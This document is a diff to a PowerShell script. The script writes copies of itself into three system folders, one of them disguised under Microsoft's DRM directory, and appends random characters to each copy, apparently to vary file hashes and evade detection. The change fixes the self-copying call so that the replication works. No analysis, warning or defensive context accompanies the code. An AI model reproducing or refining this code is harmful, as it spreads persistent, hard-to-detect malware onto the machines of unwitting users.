@@ -5,19 +5,19 @@ $charlie_path = "C:\ProgramData\Microsoft\DRM"
 
 $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
 if (-not (Test-Path "$alfa_path\alfa.ps1")) {
-    $MyInvocation.MyCommand.ScriptContents | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
+    $MyInvocation.MyCommand.Definition | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
     Add-Content -Path "$alfa_path\alfa.ps1" -Value "# $random_chars"
 }
 
 $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
 if (-not (Test-Path "$bravo_path\bravo.ps1")) {
-    $MyInvocation.MyCommand.ScriptContents | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
+    $MyInvocation.MyCommand.Definition | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
     Add-Content -Path "$bravo_path\bravo.ps1" -Value "# $random_chars"
 }
 
 $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
 if (-not (Test-Path "$charlie_path\charlie.ps1")) {
-    $MyInvocation.MyCommand.ScriptContents | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
+    $MyInvocation.MyCommand.Definition | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
     Add-Content -Path "$charlie_path\charlie.ps1" -Value "# $random_chars"
 }
 
